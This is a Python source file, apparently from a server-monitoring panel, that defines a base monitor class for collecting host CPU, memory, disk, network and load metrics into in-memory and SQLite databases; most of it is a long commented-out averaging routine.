# coding: utf-8
import datetime
import os.path, threading
from contextlib import contextmanager
import re, json, time, core.include.public as public
import core.include.sqlite as sqlite
from core.include.monitor_exceptions import BtMonitorException
import core.include.cron_task as cron_task
import copy
import weakref
import core.include.Locker as Locker
import queue

from core import g
# 导入MurmurHash3
import core.include.pymmh3 as mmh3
import core.include.monitor_enums as monitor_enums

import core.include.monitor_db_manager as monitor_db_manager
from modules.authModule.main import main as AuthModule

# monitor_db_manager = public.import_via_loader('{}/core/include/monitor_db_manager.py'.format(public.get_panel_path()))
# AuthModule = public.import_via_loader('{}/modules/authModule/main.py'.format(public.get_panel_path())).main


class BasicMonitor:
    '''
        云监控基类
        @author Zhj<2022-06-23>
    '''

    # 数据库连接字典
    __DB_DICT = {}
    __DB_DICT_UPDATE_LOCK = threading.Lock()
    __MATCH_TABLE_NAME_REGEXP = re.compile(r'^([\w`]+)(?:(?:\s+AS\s+|\s+)([\w`]+))?$', flags=re.IGNORECASE)

    # __DB_FILE = 'monitor'
    __DB_FILE = 'monitor_mgr'
    __INITIALIZED_CACHE_KEY = 'BT_MONITOR_CACHE__INITIALIZED__'
    __INITIALIZED_FILENAME = '{}/data/initialized'.format(public.get_panel_path())

    # 使用In-Memory模式连接数据库并初始化
    __DB_MEMORY = monitor_db_manager.MonitorDbMemory(True)

    # 主机信息上一次存储时间 {'sid': 'last_store_time', ...}
    __SYSTEMINFO_LAST_STORE_TIME = {}

    # 进程信息上一次存储时间 {'sid': 'last_store_time', ...}
    __PROCESS_INFO_LAST_STORE_TIME = {}

    # 进程网络信息上一次存储时间 {'sid': 'last_store_time', ...}
    __PROCESS_NETWORK_IO_LAST_STORE_TIME = {}

    # 已缓存的主机信息 {'sid': history<dict>, ...}
    __CACHED_SYSTEMINFO = {}
    __UPDATE_CACHED_SYSTEMINFO_LOCK = threading.Lock()

    # 已缓存的进程信息 {'sid|process_name|boot_name': {process_id, boot_time}, ...}
    __CACHED_PROCESSES = {}
    __UPDATE_CACHED_PROCESSES_LOCK = threading.Lock()

    # 已缓存的进程网络信息
    __CACHED_PROCESS_NET = {}
    __UPDATE_CACHED_PROCESS_NET_LOCK = threading.Lock()

    # 已缓存的主机总内存大小 {'sid': mem_total, ...}
    __CACHED_SERVER_MEM_TOTAL = {}

    # 数据写入磁盘间隔/分钟
    __DISK_WRITE_PER_MINUTES = 7.5

    # 主机进程列表已加载入内存标志
    __PROCESS_LIST_STORED_IN_MEMORY = set()

    # 主机最近一次命令执行时间
    # __LATEST_COMMAND_EXECUTE_TIME = {}

    # 更新SSH登录日志统计数据(每天)锁
    __UPDATING_SSH_LOGIN_LOG_DAILY = threading.Lock()

    # 最新SSH登录日志(最多20条)
    LATEST_SSH_LOGIN_LOGS = []

    # 最新SSH登录日志更新锁
    UPDATE_LATEST_SSH_LOGIN_LOGS_LOCK = threading.Lock()

    # 进程数据写入锁
    __STORE_PROCESS_LOCK = threading.Lock()

    # 进程名称与启动路径更新队列
    __PROCESS_NAME_EXE_QUEUE = queue.Queue()

    # 最短Agent端请求间隔/秒
    __MIN_AGENT_REQUEST_INTERVAL = 4

    # 请求Agent锁
    __AGENT_REQUEST_LOCK = threading.Lock()

    def __init__(self):
        # 初始化云监控
        # self.init_cloud_monitor()
        pass

    def store_systeminfo(self, sid, systeminfo):
        '''
            @name   将主机详细信息存入数据库
            @author Zhj<2022-06-28>
            @param  sid<integer>        主机ID
            @param  systeminfo<dict>    主机详细信息
            @return bool
        '''
        # 检查主机是否在线
        # 检查磁盘空间占用是否过高
        # if not self.server_is_online(sid) or self.running_dir_used_percent_high():
        # return False
        # if not self.server_is_authorized(sid):
        #     return False
        if self.running_dir_used_percent_high():
            return False

        if isinstance(systeminfo, str):
            try:
                systeminfo = json.loads(systeminfo)
            except:
                return False

        # 过滤掉光驱设备
        systeminfo['disk_list'] = list(filter(lambda x: x['name'][:7] != '/dev/sr', systeminfo['disk_list']))

        ret_flag = True

        # 是否开启了数据采样
        sampling_opened = self.sampling_global(sid, monitor_enums.SAMPLING_GLOBAL__SERVER)

        # 获取当前时间
        cur_time = int(time.time())

        # 将信息写入临时表
        with self.__DB_MEMORY as db_tmp:
            if sampling_opened:
                # 主机CPU信息收集
                if float(systeminfo['cpu']['percent']) > 0 and not self.sampling_closed('cpu', sid=sid):
                    db_tmp.query() \
                        .name('server_cpu_info_list') \
                        .insert({
                            'sid': sid,
                            'percent': systeminfo['cpu']['percent'],
                        }, get_rowid=False)

                # 主机内存信息收集
                if not self.sampling_closed('mem', sid=sid):
                    db_tmp.query() \
                        .name('server_mem_info_list') \
                        .insert({
                            'sid': sid,
                            'percent': systeminfo['mem']['used_percent'],
                            'used': systeminfo['mem']['used'],
                        }, get_rowid=False)

                # 主机SWAP信息收集
                if float(systeminfo['mem']['swap_used_percent']) > 0 and not self.sampling_closed('swap', sid=sid):
                    db_tmp.query() \
                        .name('server_swap_info_list') \
                        .insert({
                            'sid': sid,
                            'percent': systeminfo['mem']['swap_used_percent'],
                            'used': systeminfo['mem']['swap_used'],
                        }, get_rowid=False)

                # 磁盘占用数据采样是否开启
                disk_sampling_opened = not self.sampling_closed('disk', sid=sid)

                # 磁盘IO数据采样是否开启
                disk_io_sampling_opened = not self.sampling_closed('disk_io', sid=sid)

                if disk_sampling_opened or disk_io_sampling_opened:
                    disk_insert_data = []
                    # 主机磁盘IO信息收集
                    for disk_info in systeminfo['disk_list']:
                        disk_insert_data.append({
                            'sid': sid,
                            'name': disk_info['name'],
                            'used': disk_info['used'] if disk_sampling_opened else 0,
                            'used_percent': disk_info['used_percent'] if disk_sampling_opened else 0,
                            'inodes_used': disk_info['inodes_used'] if disk_sampling_opened else 0,
                            'inodes_used_percent': disk_info['inodes_used_percent'] if disk_sampling_opened else 0,
                            'iops': disk_info['iops'] if disk_io_sampling_opened else 0,
                            'io_percent': disk_info['io_percent'] if disk_sampling_opened else 0,
                            'read_bytes_per_second': disk_info['read_bytes_per_second'] if disk_io_sampling_opened else 0,
                            'write_bytes_per_second': disk_info['write_bytes_per_second'] if disk_io_sampling_opened else 0,
                        })

                    if len(disk_insert_data) > 0:
                        db_tmp.query() \
                            .name('server_disk_info_list') \
                            .insert_all(disk_insert_data)

                if not self.sampling_closed('net_io', sid=sid):
                    net_insert_data = []
                    # 主机网卡IO信息收集
                    for net_info in systeminfo['net_io_list']:
                        net_insert_data.append({
                            'sid': sid,
                            'name': net_info['name'],
                            'sent_per_second': net_info['sent_per_second'],
                            'recv_per_second': net_info['recv_per_second'],
                        })

                    if len(net_insert_data) > 0:
                        db_tmp.query() \
                            .name('server_net_info_list') \
                            .insert_all(net_insert_data)

                if not self.sampling_closed('load_avg', sid=sid) and systeminfo.get("loadavg") is not None:
                    # 主机负载信息收集
                    if float(systeminfo['loadavg']['last1min']) > 0 \
                            or float(systeminfo['loadavg']['last5min']) > 0 \
                            or float(systeminfo['loadavg']['last15min']) > 0:
                        db_tmp.query() \
                            .name('server_loadavg_info_list') \
                            .insert({
                                'sid': sid,
                                'last_1_min': systeminfo['loadavg']['last1min'],
                                'last_5_min': systeminfo['loadavg']['last5min'],
                                'last_15_min': systeminfo['loadavg']['last15min'],
                            }, get_rowid=False)

        # 缓存实时主机信息
        self.cache_realtime_server_info(
            sid=sid,
            host_info=systeminfo['host'],
            cpu_info=systeminfo['cpu'],
            mem_info=systeminfo['mem'],
            disk_info=systeminfo['disk_list'],
            net_info=systeminfo['net_io_list'],
            load_avg=systeminfo.get('loadavg', {})
        )

        # 存入内存中
        self.__CACHED_SERVER_MEM_TOTAL[sid] = int(systeminfo['mem']['total'])

        # 根据磁盘写入间隔写入数据
        time_line = cur_time - (self.__DISK_WRITE_PER_MINUTES * 60)
        # save_time_line = cur_time - 60
        last_store_time = self.__SYSTEMINFO_LAST_STORE_TIME.get(sid, 0)
        if last_store_time == 0:
            self.__SYSTEMINFO_LAST_STORE_TIME[sid] = cur_time
        if self.__SYSTEMINFO_LAST_STORE_TIME.get(sid, 0) < time_line:
            # 记录本次存储时间
            self.__SYSTEMINFO_LAST_STORE_TIME[sid] = cur_time
            # 更新主机详情信息
            with monitor_db_manager.db_mgr() as db:
                try:
                    # 关闭事务自动提交
                    db.autocommit(False)

                    # 首先尝试更新主机详细信息
                    update_data = {
                        'host_info': json.dumps(systeminfo['host']),
                        'cpu_info': json.dumps(systeminfo['cpu']),
                        'mem_info': json.dumps(systeminfo['mem']),
                        'disk_info': json.dumps(systeminfo['disk_list']),
                        'net_info': json.dumps(systeminfo['net_io_list']),
                        'load_avg': json.dumps(systeminfo.get('loadavg', {})),
                        'update_time': cur_time,
                    }

                    server_type_dict = {
                        "linux": 0,
                        "windows": 1,
                    }

                    server_type = server_type_dict.get(str(systeminfo['host'].get("os", "")).lower())
                    if server_type is not None:
                        # 修改主机系统类别
                        db.query() \
                            .name('servers') \
                            .where('`sid` = ?', int(sid)) \
                            .update({"type": server_type})

                    up_ret = db.query() \
                        .name('server_details') \
                        .where('`sid` = ?', int(sid)) \
                        .update(update_data)
                    if up_ret == 0 \
                            and not db.query() \
                            .name('server_details') \
                            .where('`sid` = ?', int(sid)) \
                            .field('sid') \
                            .exists():

                        # 使用非阻塞模式
                        db.set_blocking(False)

                        # 更新失败且数据不存在则插入
                        update_data['sid'] = sid
                        db.query() \
                            .name('server_details') \
                            .insert(update_data, get_rowid=False)

                    # 提交事务
                    db.commit()
                except BaseException as e:
                    # 回滚事务
                    db.rollback()

                    # 记录异常堆栈信息
                    public.print_exc_stack(e)

                    return False

            #
            # # 主机CPU收集信息新增数据
            # serv_cpu_insert_data = None
            #
            # # 主机内存收集信息新增数据
            # serv_mem_insert_data = None
            #
            # # 主机swap收集信息新增数据
            # serv_swap_insert_data = None
            #
            # # 主机磁盘收集信息新增数据
            # serv_disk_insert_data = None
            #
            # # 主机网卡收集信息新增数据
            # serv_net_insert_data = None
            #
            # # 主机负载收集信息新增数据
            # serv_loadavg_insert_data = None
            #
            # # 从临时表中获取平均数据(采样时间内数据的降序前20%数据平均值)
            # # cpu 平均负载 内存 SWAP 磁盘占用 磁盘IO 网络
            # with self.__DB_MEMORY as db_tmp:
            #     # 计算cpu使用率
            #     cnt = db_tmp \
            #         .query() \
            #         .name('server_cpu_info_list') \
            #         .where('sid=?', sid) \
            #         .where('create_time>=?', time_line) \
            #         .count()
            #     # offset = int(0.2 * cnt)
            #
            #     sub_query = db_tmp \
            #         .query() \
            #         .name('server_cpu_info_list') \
            #         .where('sid=?', sid) \
            #         .where('create_time>=?', time_line) \
            #         .order('percent', 'desc') \
            #         .build_sql(True)
            #
            #     # cpu_percent_avg = db_tmp \
            #     #     .query() \
            #     #     .from_sub_query(sub_query) \
            #     #     .avg('percent', 2)
            #     #
            #     # # cpu平均使用大于0时记录
            #     # if cpu_percent_avg > 0:
            #     #     serv_cpu_insert_data = {
            #     #         'sid': sid,
            #     #         'percent': cpu_percent_avg,
            #     #     }
            #
            #     cpu_percent_samples_query = db_tmp.query() \
            #         .from_sub_query(sub_query) \
            #         .select()
            #
            #     cpu_percent_samples = list(cpu_percent_samples_query)
            #     # 根据每分钟区间内的数据计算cpu平均值
            #     for i in cpu_percent_samples:
            #         i['time_slot'] = int(i['create_time'] / 60)
            #     cpu_percent_samples = self.get_average_minute(cpu_percent_samples, 'percent')
            #
            #     cpu_percent_values = [s['percent'] for s in cpu_percent_samples]
            #     avg2_cpu_percent = self.get_average(cpu_percent_values)
            #
            #     # avg1_cpu_percent = sum(cpu_percent_values) / 20
            #     # if sum(cpu_percent_values) > 0:
            #     #     avg1_cpu_percent = sum(cpu_percent_values) / 20
            #     #
            #     #     # 计算第二次均值
            #     #     cpu_percent_values_above_avg1 = [v for v in cpu_percent_values if v >= avg1_cpu_percent]
            #     #     avg2_cpu_percent = sum(cpu_percent_values_above_avg1) / len(cpu_percent_values_above_avg1)
            #     # else:
            #     #     avg2_cpu_percent = 0
            #
            #     # cpu平均使用大于0时记录
            #     if avg2_cpu_percent > 0:
            #         serv_cpu_insert_data = {
            #             'sid': sid,
            #             'percent': round(avg2_cpu_percent, 2),
            #         }
            #
            #     # 删除临时数据
            #     db_tmp.query() \
            #         .name('server_cpu_info_list') \
            #         .where('sid=?', sid) \
            #         .where('create_time<?', save_time_line) \
            #         .delete()
            #
            #     # 计算内存平均使用率与平均占用
            #     cnt = db_tmp \
            #         .query() \
            #         .name('server_mem_info_list') \
            #         .where('sid=?', sid) \
            #         .where('create_time>=?', time_line) \
            #         .count()
            #
            #     # offset = int(0.2 * cnt)
            #
            #     sub_query = db_tmp \
            #         .query() \
            #         .name('server_mem_info_list') \
            #         .where('sid=?', sid) \
            #         .where('create_time>=?', time_line) \
            #         .order('percent', 'DESC') \
            #         .build_sql(True)
            #
            #     # mem_avg_info = db_tmp \
            #     #     .query() \
            #     #     .from_sub_query(sub_query) \
            #     #     .field('ifnull(round(avg(`percent`),2),0) as `percent_avg`',
            #     #            'ifnull(round(avg(`used`)),0) as `used_avg`') \
            #     #     .find()
            #     #
            #     # # 内存平均使用率或平均占用大于0时记录
            #     # if mem_avg_info['percent_avg'] > 0 or mem_avg_info['used_avg'] > 0:
            #     #     serv_mem_insert_data = {
            #     #         'sid': sid,
            #     #         'percent': mem_avg_info['percent_avg'],
            #     #         'used': mem_avg_info['used_avg'],
            #     #     }
            #
            #     mem_samples_query = db_tmp.query() \
            #         .from_sub_query(sub_query) \
            #         .select()
            #
            #     mem_samples = list(mem_samples_query)
            #
            #     # 根据每分钟区间内的数据计算平均值
            #     for i in mem_samples:
            #         i['time_slot'] = int(i['create_time'] / 60)
            #
            #     pmem_samples = self.get_average_minute(mem_samples, 'percent')
            #     umem_samples = self.get_average_minute(mem_samples, 'used')
            #
            #
            #     # 计算第一次均值
            #     mem_percent_values = [s['percent'] for s in pmem_samples]
            #     mem_used_values = [s['used'] for s in umem_samples]
            #     avg2_mem_percent = self.get_average(mem_percent_values)
            #     avg2_mem_used = self.get_average(mem_used_values)
            #     # if sum(mem_percent_values) > 0:
            #     #     avg1_mem_percent = sum(mem_percent_values) / 20
            #     #     mem_percent_values_above_avg1 = [v for v in mem_percent_values if v >= avg1_mem_percent]
            #     #     avg2_mem_percent = sum(mem_percent_values_above_avg1) / len(mem_percent_values_above_avg1)
            #     # else:
            #     #     avg2_mem_percent = 0
            #     #
            #     # if sum(mem_used_values) > 0:
            #     #     avg1_mem_used = sum(mem_used_values) / 20
            #     #     mem_used_values_above_avg1 = [v for v in mem_used_values if v >= avg1_mem_used]
            #     #     avg2_mem_used = sum(mem_used_values_above_avg1) / len(mem_used_values_above_avg1)
            #     # else:
            #     #     avg2_mem_used = 0
            #
            #     # 内存平均使用率或平均占用大于0时记录
            #     if avg2_mem_percent > 0 or avg2_mem_used > 0:
            #         serv_mem_insert_data = {
            #             'sid': sid,
            #             'percent': round(avg2_mem_percent, 2),
            #             'used': round(avg2_mem_used),
            #         }
            #
            #     # 删除临时数据
            #     db_tmp.query() \
            #         .name('server_mem_info_list') \
            #         .where('sid=?', sid) \
            #         .where('create_time<?', save_time_line) \
            #         .delete()
            #
            #     # 计算swap平均使用率与平均占用
            #     cnt = db_tmp \
            #         .query() \
            #         .name('server_swap_info_list') \
            #         .where('sid=?', sid) \
            #         .where('create_time>=?', time_line) \
            #         .count()
            #
            #     # offset = int(0.2 * cnt)
            #
            #     sub_query = db_tmp \
            #         .query() \
            #         .name('server_swap_info_list') \
            #         .where('sid=?', sid) \
            #         .where('create_time>=?', time_line) \
            #         .order('percent', 'DESC')\
            #         .build_sql(True)
            #
            #     # swap_avg_info = db_tmp \
            #     #     .query() \
            #     #     .from_sub_query(sub_query) \
            #     #     .field('ifnull(round(avg(`percent`),2),0) as `percent_avg`',
            #     #            'ifnull(round(avg(`used`)),0) as `used_avg`') \
            #     #     .find()
            #     #
            #     # # swap平均使用率或平均占用大于0时记录
            #     # if swap_avg_info['percent_avg'] > 0 or swap_avg_info['used_avg'] > 0:
            #     #     serv_swap_insert_data = {
            #     #         'sid': sid,
            #     #         'percent': swap_avg_info['percent_avg'],
            #     #         'used': swap_avg_info['used_avg'],
            #     #     }
            #
            #     swap_samples_query = db_tmp.query() \
            #         .from_sub_query(sub_query) \
            #         .select()
            #
            #     swap_samples = list(swap_samples_query)
            #     # 根据每分钟区间内的数据计算平均值
            #     for i in swap_samples:
            #         i['time_slot'] = int(i['create_time'] / 60)
            #
            #     pswap_samples = self.get_average_minute(swap_samples, 'percent')
            #     uswap_samples = self.get_average_minute(swap_samples, 'used')
            #
            #
            #     # 计算第一次均值
            #     swap_percent_values = [s['percent'] for s in pswap_samples]
            #     swap_used_values = [s['used'] for s in uswap_samples]
            #     avg2_swap_percent = self.get_average(swap_percent_values)
            #     avg2_swap_used = self.get_average(swap_used_values)
            #
            #     # if sum(swap_percent_values) > 0:
            #     #
            #     #     avg1_swap_percent = sum(swap_percent_values) / 20
            #     #
            #     #     public.print_log('swap_samples列表1={} -和1={} --均值1={}'.format(swap_percent_values,sum(swap_percent_values), avg1_swap_percent), _level='error')
            #     #
            #     #     swap_percent_values_above_avg1 = [v for v in swap_percent_values if v >= avg1_swap_percent]
            #     #
            #     #     public.print_log('swap_samples列表1={} -和1={} --均值1={} --列表2={} --和2={} '
            #     #                      .format(swap_percent_values,sum(swap_percent_values), avg1_swap_percent, swap_percent_values_above_avg1,
            #     #                              sum(swap_percent_values_above_avg1), ), _level='error')
            #     #
            #     #     avg2_swap_percent = sum(swap_percent_values_above_avg1) / len(swap_percent_values_above_avg1)
            #     #
            #     #     public.print_log('swap_samples列表1={} -和1={} --均值1={} --列表2={} --和2={} --均值2={}'
            #     #                      .format(swap_percent_values,sum(swap_percent_values), avg1_swap_percent, swap_percent_values_above_avg1,
            #     #                              sum(swap_percent_values_above_avg1), avg2_swap_percent), _level='error')
            #     #
            #     # else:
            #     #     avg2_swap_percent = 0
            #     #
            #     # if sum(swap_used_values) > 0:
            #     #     avg1_swap_used = sum(swap_used_values) / 20
            #     #     swap_used_values_above_avg1 = [v for v in swap_used_values if v >= avg1_swap_used]
            #     #     avg2_swap_used = sum(swap_used_values_above_avg1) / len(swap_used_values_above_avg1)
            #     # else:
            #     #     avg2_swap_used = 0
            #
            #
            #     # # 计算第二次均值
            #     # swap_percent_values_above_avg1 = [v for v in swap_percent_values if v >= avg1_swap_percent]
            #     # swap_used_values_above_avg1 = [v for v in swap_used_values if v >= avg1_swap_used]
            #     # avg2_swap_percent = sum(swap_percent_values_above_avg1) / len(swap_percent_values_above_avg1)
            #     # avg2_swap_used = sum(swap_used_values_above_avg1) / len(swap_used_values_above_avg1)
            #
            #     # swap平均使用率或平均占用大于0时记录
            #     if avg2_swap_percent > 0 or avg2_swap_used > 0:
            #         serv_swap_insert_data = {
            #             'sid': sid,
            #             'percent': round(avg2_swap_percent, 2),
            #             'used': round(avg2_swap_used),
            #         }
            #
            #     # 删除临时数据
            #     db_tmp.query() \
            #         .name('server_swap_info_list') \
            #         .where('sid=?', sid) \
            #         .where('create_time<?', save_time_line) \
            #         .delete()
            #
            #     # 计算磁盘IO平均信息
            #     cnt = db_tmp \
            #         .query() \
            #         .name('server_disk_info_list') \
            #         .where('sid=?', sid) \
            #         .where('create_time>=?', time_line) \
            #         .order('`read_bytes_per_second` + `write_bytes_per_second`', 'desc') \
            #         .group('name, sid') \
            #         .field('name', 'sid', 'count(*) as `cnt`') \
            #         .select()
            #
            #     serv_disk_info = []
            #
            #     for item in cnt:
            #         if item['cnt'] == 0:
            #             continue
            #
            #         # offset = int(0.2 * item['cnt'])
            #
            #         sub_query = db_tmp \
            #             .query() \
            #             .name('server_disk_info_list') \
            #             .where('sid=?', sid) \
            #             .where('name', item['name'])\
            #             .where('create_time>=?', time_line) \
            #             .order('`read_bytes_per_second` + `write_bytes_per_second`', 'desc')\
            #             .build_sql(True)
            #
            #         # i_data = db_tmp.query() \
            #         #     .from_sub_query(sub_query) \
            #         #     .field('sid', 'name', 'ifnull(round(avg(`used`)),0) as `used`',
            #         #            'ifnull(round(avg(`used_percent`),2),0) as `used_percent`',
            #         #            'ifnull(round(avg(`inodes_used`)),2) as `inodes_used`',
            #         #            'ifnull(round(avg(`inodes_used_percent`),2),0) as `inodes_used_percent`',
            #         #            'ifnull(round(avg(`iops`)),0) as `iops`',
            #         #            'ifnull(round(avg(`io_percent`),2),0) as `io_percent`',
            #         #            'ifnull(round(avg(`read_bytes_per_second`)),0) as `read_bytes_per_second`',
            #         #            'ifnull(round(avg(`write_bytes_per_second`)),0) as `write_bytes_per_second`') \
            #         #     .find()
            #
            #
            #         # 获取最近的磁盘IO样本
            #         samples_query = db_tmp.query() \
            #             .from_sub_query(sub_query) \
            #             .select()
            #
            #         samples = list(samples_query)
            #         # 根据每分钟区间内的数据计算平均值
            #         for i in samples:
            #             i['time_slot'] = int(i['create_time'] / 60)
            #
            #         usamples = self.get_average_minute(samples, 'used')
            #         upsamples = self.get_average_minute(samples, 'used_percent')
            #         iuusamples = self.get_average_minute(samples, 'inodes_used')
            #         iupsamples = self.get_average_minute(samples, 'inodes_used_percent')
            #         isamples = self.get_average_minute(samples, 'iops')
            #         iosamples = self.get_average_minute(samples, 'io_percent')
            #         rsamples = self.get_average_minute(samples, 'read_bytes_per_second')
            #         wsamples = self.get_average_minute(samples, 'write_bytes_per_second')
            #
            #         # 计算第一次均值
            #         used_values = [s['used'] for s in usamples]
            #         used_percent_values = [s['used_percent'] for s in upsamples]
            #         inodes_used_values = [s['inodes_used'] for s in iuusamples]
            #         inodes_used_percent_values = [s['inodes_used_percent'] for s in iupsamples]
            #         iops_values = [s['iops'] for s in isamples]
            #         io_percent_values = [s['io_percent'] for s in iosamples]
            #         read_values = [s['read_bytes_per_second'] for s in rsamples]
            #         write_values = [s['write_bytes_per_second'] for s in wsamples]
            #
            #         # 判断所有列表同时为空
            #         if not used_values and not used_percent_values and not inodes_used_values and not inodes_used_percent_values and not iops_values and not io_percent_values and not read_values and not write_values:
            #             continue
            #
            #         avg2_used = self.get_average(used_values)
            #         avg2_used_percent = self.get_average(used_percent_values)
            #         avg2_inodes_used = self.get_average(inodes_used_values)
            #         avg2_inodes_used_percent = self.get_average(inodes_used_percent_values)
            #         avg2_iops = self.get_average(iops_values)
            #         avg2_io_percent = self.get_average(io_percent_values)
            #         avg2_read = self.get_average(read_values)
            #         avg2_write = self.get_average(write_values)
            #
            #         # avg1_used = sum(used_values) / len(used_values)
            #         # avg1_used_percent = sum(used_percent_values) / 20
            #         # avg1_inodes_used = sum(inodes_used_values) / 20
            #         # avg1_inodes_used_percent = sum(inodes_used_percent_values) / 20
            #         # avg1_iops = sum(iops_values) / 20
            #         # avg1_io_percent = sum(io_percent_values) / 20
            #         # avg1_read = sum(read_values) / 20
            #         # avg1_write = sum(write_values) / 20
            #         #
            #         # # 计算第二次均值
            #         # used_avg1 = [v for v in used_values if v >= avg1_used]
            #         # used_percent_avg1 = [v for v in used_percent_values if v >= avg1_used_percent]
            #         # inodes_used_avg1 = [v for v in inodes_used_values if v >= avg1_inodes_used]
            #         # inodes_used_percent_avg1 = [v for v in inodes_used_percent_values if v >= avg1_inodes_used_percent]
            #         # iops_avg1 = [v for v in iops_values if v >= avg1_iops]
            #         # io_percent_avg1 = [v for v in io_percent_values if v >= avg1_io_percent]
            #         # read_avg1 = [v for v in read_values if v >= avg1_read]
            #         # write_avg1 = [v for v in write_values if v >= avg1_write]
            #         #
            #         # avg2_used = 0 if len(used_avg1) == 0 else sum(used_avg1) / len(used_avg1)
            #         # avg2_used_percent = 0 if len(used_percent_avg1) == 0 else sum(used_percent_avg1) / len(used_percent_avg1)
            #         # avg2_inodes_used = 0 if len(inodes_used_avg1) == 0 else sum(inodes_used_avg1) / len(inodes_used_avg1)
            #         # avg2_inodes_used_percent = 0 if len(inodes_used_percent_avg1) == 0 else sum(inodes_used_percent_avg1) / len(inodes_used_percent_avg1)
            #         # avg2_iops = 0 if len(iops_avg1) == 0 else sum(iops_avg1) / len(iops_avg1)
            #         # avg2_io_percent = 0 if len(io_percent_avg1) == 0 else sum(io_percent_avg1) / len(io_percent_avg1)
            #         # avg2_read = 0 if len(read_avg1) == 0 else sum(read_avg1) / len(read_avg1)
            #         # avg2_write = 0 if len(write_avg1) == 0 else sum(write_avg1) / len(write_avg1)
            #
            #         # 将结果存储在`i_data`变量中
            #         i_data = {
            #             'sid': item['sid'],
            #             'name': item['name'],
            #             'used': round(avg2_used),
            #             'used_percent': round(avg2_used_percent, 2),
            #             'inodes_used': round(avg2_inodes_used),
            #             'inodes_used_percent': round(avg2_inodes_used_percent, 2),
            #             'iops': round(avg2_iops),
            #             'io_percent': round(avg2_io_percent, 2),
            #             'read_bytes_per_second': round(avg2_read),
            #             'write_bytes_per_second': round(avg2_write)
            #         }
            #         if i_data is None or i_data['sid'] is None:
            #             continue
            #         serv_disk_info.append(i_data)
            #
            #     if len(serv_disk_info) > 0:
            #         serv_disk_insert_data = serv_disk_info
            #         serv_disk_info = None
            #         del (serv_disk_info,)
            #
            #     # 删除临时数据
            #     db_tmp.query() \
            #         .name('server_disk_info_list') \
            #         .where('sid=?', sid) \
            #         .where('create_time<?', save_time_line) \
            #         .delete()
            #
            #     # 计算网卡IO平均信息
            #     cnt = db_tmp \
            #         .query() \
            #         .name('server_net_info_list') \
            #         .where('sid=?', sid) \
            #         .where('create_time>=?', time_line) \
            #         .order('`sent_per_second` + `recv_per_second`', 'desc') \
            #         .group('name, sid') \
            #         .field('name', 'sid', 'count(*) as `cnt`') \
            #         .select()
            #
            #     net_avg_info = []
            #
            #     for item in cnt:
            #         if item['cnt'] == 0:
            #             continue
            #
            #         # offset = int(0.2 * item['cnt'])
            #
            #         sub_query = db_tmp \
            #             .query() \
            #             .name('server_net_info_list') \
            #             .where('sid=?', sid) \
            #             .where('name', item['name'])\
            #             .where('create_time>=?', time_line) \
            #             .order('`sent_per_second` + `recv_per_second`', 'desc')\
            #             .build_sql(True)
            #
            #         # i_data = db_tmp.query() \
            #         #     .from_sub_query(sub_query) \
            #         #     .field('sid', 'name', 'ifnull(round(avg(`sent_per_second`)),0) as `sent_per_second`',
            #         #            'ifnull(round(avg(`recv_per_second`)),0) as `recv_per_second`') \
            #         #     .find()
            #
            #         # 获取最近的20个网卡IO样本
            #         samples_query = db_tmp.query() \
            #             .from_sub_query(sub_query) \
            #             .select()
            #
            #         samples = list(samples_query)
            #
            #         # 根据每分钟区间内的数据计算平均值
            #         for i in samples:
            #             i['time_slot'] = int(i['create_time'] / 60)
            #
            #         ssamples = self.get_average_minute(samples, 'sent_per_second')
            #         rsamples = self.get_average_minute(samples, 'recv_per_second')
            #
            #         # 计算第一次均值
            #         sent_values = [s['sent_per_second'] for s in ssamples]
            #         recv_values = [s['recv_per_second'] for s in rsamples]
            #
            #         if len(sent_values) == 0 or len(recv_values) == 0:
            #             continue
            #
            #         avg2_sent = self.get_average(sent_values)
            #         avg2_recv = self.get_average(recv_values)
            #
            #         # avg1_sent = sum(sent_values) / 20
            #         # avg1_recv = sum(recv_values) / 20
            #         #
            #         # # 计算第二次均值
            #         # sent_values_above_avg1 = [v for v in sent_values if v >= avg1_sent]
            #         # recv_values_above_avg1 = [v for v in recv_values if v >= avg1_recv]
            #         # avg2_sent = sum(sent_values_above_avg1) / len(sent_values_above_avg1)
            #         # avg2_recv = sum(recv_values_above_avg1) / len(recv_values_above_avg1)
            #
            #         # 将结果存储在`i_data`变量中
            #         i_data = {
            #             'sid': item['sid'],
            #             'name': item['name'],
            #             'sent_per_second': round(avg2_sent),
            #             'recv_per_second': round(avg2_recv)
            #         }
            #
            #         if i_data is None or i_data['sid'] is None:
            #             continue
            #
            #         net_avg_info.append(i_data)
            #
            #     if len(net_avg_info) > 0:
            #         serv_net_insert_data = net_avg_info
            #         net_avg_info = None
            #         del (net_avg_info,)
            #
            #     # 删除临时数据
            #     db_tmp.query() \
            #         .name('server_net_info_list') \
            #         .where('sid=?', sid) \
            #         .where('create_time<?', save_time_line) \
            #         .delete()
            #
            #     # 计算平均负载信息
            #     # cnt = db_tmp \
            #     #     .query() \
            #     #     .name('server_loadavg_info_list') \
            #     #     .where('sid=?', sid) \
            #     #     .where('create_time>=?', time_line) \
            #     #     .count()
            #
            #     # # offset = int(0.2 * cnt)
            #
            #     # loadavg_avg_info = db_tmp.query() \
            #     #     .from_sub_query(sub_query) \
            #     #     .field('sid', 'ifnull(round(avg(`last_1_min`),2),0) as `last_1_min`',
            #     #            'ifnull(round(avg(`last_5_min`),2),0) as `last_5_min`',
            #     #            'ifnull(round(avg(`last_15_min`),2),0) as `last_15_min`') \
            #     #     .find()
            #     #
            #     # if loadavg_avg_info['last_1_min'] + loadavg_avg_info['last_5_min'] + loadavg_avg_info[
            #     #     'last_15_min'] > 0:
            #     #     serv_loadavg_insert_data = loadavg_avg_info
            #
            #     sub_query = db_tmp \
            #         .query() \
            #         .name('server_loadavg_info_list') \
            #         .where('sid=?', sid) \
            #         .where('create_time>=?', time_line) \
            #         .order('`last_1_min`+ `last_5_min` + `last_15_min`', 'DESC') \
            #         .build_sql(True)
            #
            #     loadavg_samples_query = db_tmp.query() \
            #         .from_sub_query(sub_query) \
            #         .select()
            #
            #     loadavg_samples = list(loadavg_samples_query)
            #     # 根据每分钟区间内的数据计算平均值
            #     for i in loadavg_samples:
            #         i['time_slot'] = int(i['create_time'] / 60)
            #
            #     loadavg_samples_1 = self.get_average_minute(loadavg_samples, 'last_1_min')
            #     loadavg_samples_5 = self.get_average_minute(loadavg_samples, 'last_5_min')
            #     loadavg_samples_15 = self.get_average_minute(loadavg_samples, 'last_15_min')
            #
            #
            #     # 计算第一次均值
            #     last_1_min_values = [s['last_1_min'] for s in loadavg_samples_1]
